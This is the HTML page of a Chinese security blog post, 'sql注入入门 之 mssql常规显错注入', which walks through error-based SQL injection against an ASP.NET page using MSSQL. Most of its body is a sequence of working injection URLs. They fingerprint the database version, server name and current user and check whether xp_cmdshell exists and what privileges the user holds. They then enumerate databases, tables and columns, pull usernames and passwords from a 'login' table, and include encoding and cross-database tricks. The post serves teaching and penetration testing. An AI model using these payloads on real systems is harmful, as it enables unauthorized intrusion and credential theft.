@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="sql注入入门 之 mssql常规显错注入"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>sql注入入门 之 mssql常规显错注入 - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/05/16/mssql-error-injection/">
+                sql注入入门 之 mssql常规显错注入
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-16</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/all-sql-injection/">all sql injection</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>1,mssql常规显错型,实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection1.png" alt="&#39;&#39;"><br></p>
+<p>2,依旧先尝试经典的单引号,数据库如期报错,报错原因的很清楚,参数后面多了单引号,不过这也恰好说明我们的单引号已被带入正常查询,其实,到此为止,根据以往的经验我们也可以判断这里百分之九十是个mssql注入点,因为这很显然不是其他数据库的报错信息嘛<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection2.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>  条件为真,页面返回正常</div></pre></td></tr></table></figure>
+<p><img src="/img/mssql_error_injection3.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span> 条件为真,页面返回异常,典型的数字型注入</div></pre></td></tr></table></figure>
+<p><img src="/img/mssql_error_injection4.png" alt="&#39;&#39;"><br></p>
+<p>3,我们可以用下面的语句进一步确实目标是否真的为mssql数据库,页面返回正常则是,返回异常则不是,根据返回,没跑了,这确实是个正儿八经的mssql数据库,’sysobjects’是mssql的系统表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> exists(select * from sysobjects)</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection5.png" alt="&#39;&#39;"><br></p>
+<p>4,好吧,没说的,开始写注入语句,获取当前mssql版本,可知当前数据库版本为 2008R2<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select @@VERSION))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection6.png" alt="&#39;&#39;"><br></p>
+<p>5,获取目标机器的机器名,看机器名主要是因为有时候我们想从机器名上得知这个机器大概是干嘛的,有没有可能在内网,都可以通过这个来初步判断下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select  @@servername))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection7.png" alt="&#39;&#39;"><br></p>
+<p>6,获取当前的数据库用户名,当前数据库用户名为 ‘easysofts_kiran’,非sa,关于sa权限下的注入利用方式,后续还会有单独说明,今天的重点还是显错注入,所以为了防止跑题,这里就不多说了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select suser_sname()))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection8.png" alt="&#39;&#39;"><br></p>
+<p>7,看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=(select count(*) from master..sysobjects where xtype = <span class="string">'x'</span> <span class="keyword">and</span> name = <span class="string">'xp_cmdshell'</span>) --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection9.png" alt="&#39;&#39;"><br></p>
+<p>8,看下当前角色是否为数据库管理员,返回如下报错,很显然,并不是<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(SELECT is_srvrolemember(<span class="string">'sysadmin'</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection10.png" alt="&#39;&#39;"><br></p>
+<p>9,再看下当前角色是否为db_ownwer,我们很清楚,在这样的权限下我们可以通过各种备份方式往目标的网站目录里写文件(webshell),很显然,也不是<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select  IS_MEMBER(<span class="string">'db_owner'</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection11.png" alt="&#39;&#39;"><br></p>
+<p>10,根据上面得到的这些信息,我们发现,这就是个再正常不过的显错mssql数字型注入点,好吧,既然如此,那就按照常规查数据的方式一步步的慢慢来吧<br>首先,获取当前数据库名,如下可知当前数据库名为 ‘easysofts’,db_name()在不带任何参数时表示显示当前数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name()))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection12.png" alt="&#39;&#39;"><br></p>
+<p>如下表示第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name(<span class="number">1</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection13.png" alt="&#39;&#39;"><br></p>
+<p>如下表示第六个数据库名,像这样重复性的动作,我们依然是可以交给burpsuite来完成<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name(<span class="number">5</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection14.png" alt="&#39;&#39;"><br></p>
+<p>当然,在此之前你还可以先统计下总共有多少个库,这样,我们在burpsuite中设置payload的时候就可以更精确点了,节省时间,不过,如果你直接使用下面的语句可能会报错<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)+CHAR(<span class="number">58</span>)+(SELECT top <span class="number">1</span> CAST(COUNT([name]) AS nvarchar(<span class="number">4000</span>)) FROM [master]..[sysdatabases] )+CHAR(<span class="number">58</span>)+CHAR(<span class="number">58</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection27.png" alt="&#39;&#39;"><br></p>
+<p>把里面的’+’换成%2b即可解决问题,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT([name]) AS nvarchar(<span class="number">4000</span>)) FROM [master]..[sysdatabases] )%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection25.png" alt="&#39;&#39;"><br></p>
+<p>11,获取当前数据库中的所有表名<br>如下表示获取当前库的第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection15.png" alt="&#39;&#39;"><br></p>
+<p>通过not in条件,把每次查出来的表名都加进去,这样就可以慢慢把所有的表都遍历出来,如下表示获取第二张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>) ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection16.png" alt="&#39;&#39;"><br></p>
+<p>获取第三张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>) ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection17.png" alt="&#39;&#39;"><br></p>
+<p>获取第四张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>,<span class="string">'Login'</span>) ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection18.png" alt="&#39;&#39;"><br></p>
+<p>利用上面的方法,循环往复,直到报错为止,最后得到所有的表名如下,很显然,’login’就是我们想要的管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>,<span class="string">'Login'</span>,<span class="string">'footer'</span>,<span class="string">'feedback'</span>,<span class="string">'header'</span>,<span class="string">'slider'</span>,<span class="string">'services'</span>,<span class="string">'product'</span>) ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection19.png" alt="&#39;&#39;"><br></p>
+<p>当然,你也可以像前面一样,事先统计下当前库中表的总个数:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span>  AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT(*) AS nvarchar(<span class="number">4000</span>)) FROM information_schema.TABLES )%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection28.png" alt="&#39;&#39;"><br></p>
+<p>12,接着,获取’login’表中的所有字段名,获取的方式同上,利用not in依次遍历出所有的字段名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> column_name from information_schema.columns where table_name=<span class="string">'login'</span> ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection20.png" alt="&#39;&#39;"><br></p>
+<p>最后,获取的所有字段,名如下<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">http</span>://vuln.com/Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="built_in">convert</span>(int,(select top <span class="number">1</span> column_name <span class="built_in">from</span> information_schema.columns where table_name=<span class="string">'login'</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'login_id'</span>,<span class="string">'username'</span>,<span class="string">'password'</span>,<span class="string">'name'</span>)  ))<span class="comment">--</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection21.png" alt="&#39;&#39;"><br></p>
+<p>13,有了表名,字段名接下来的事情就很好办了,直接去查出对应字段下的数据即可<br>获取username字段下的第一条数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> username from login ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection22.png" alt="&#39;&#39;"><br></p>
+<p>获取password字段下的第一条数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> password from login ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection23.png" alt="&#39;&#39;"><br></p>
+<p>统计login中有多少条记录<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT(*) AS nvarchar(<span class="number">4000</span>)) FROM login)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection26.png" alt="&#39;&#39;"><br></p>
+<p>假设你在当前库中并没有看到管理表,这时不妨尝试跨库查,前提是你要有权限才行,如下就表示没权限,如果是这样你就要好好想想别的办法了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(SELECT DISTINCT top <span class="number">1</span> TABLE_NAME FROM (SELECT DISTINCT top <span class="number">1</span> TABLE_NAME FROM riseyour_availbgur.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection24.png" alt="&#39;&#39;"><br><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于mssql的注入语句,大家也看到了,跟mysql也差不了多少,都是从information_scheam库中获取各种数据,不过,核心还是利用convert()函数的高级显错特性,多练习多总结即可,里面暂时也没什么特别多的技术含量,比mysql好的地方就是它可能支持堆查询,这样在写注入语句的时候就很方便了,在此只是为了让大家看的更完整一些,所以写的相对比较细,在实际渗透中,怎么简洁,怎么快,怎么方便,怎么搞,完全不用刻意去按照我们的流程来,举一反三,灵活变通才是关键当然,mssql本身还有很多高级特性,但,这不是一两篇文章就能说的清楚的,来日方长,慢慢积累吧……<br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/sqlinjection/">#sqlinjection</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
